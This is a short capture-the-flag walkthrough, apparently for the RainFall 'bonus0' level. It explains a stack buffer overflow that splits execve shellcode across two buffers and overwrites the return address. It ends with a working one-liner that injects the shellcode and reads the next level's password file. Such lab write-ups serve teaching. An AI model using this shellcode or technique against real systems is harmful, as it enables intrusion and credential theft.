# Walkthrough

## Disassembling executable

see source.c 


## Analysis

We copy the 20 first bytes of payload into the first buffer, which gets copied into str, then we write the four last bytes of our payload into the second buffer, and we fill the buffer with random value until we reach the eip register, there we change the value of eip to the address of str. this buffer gets concatenated into str so our payload is full in str. when the program leaves the function it jumps to the beginning of str and executes our payload.


```
bonus0@RainFall:~$ ((python -c "print('\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99')"); (python -c "print('\xb0\x0b\xcd\x80' + 'A' * 5 + '\x26\xf7\xff\xbf' + 'A' * 7)"); echo "cat /home/user/bonus1/.pass") | ./bonus0 
```
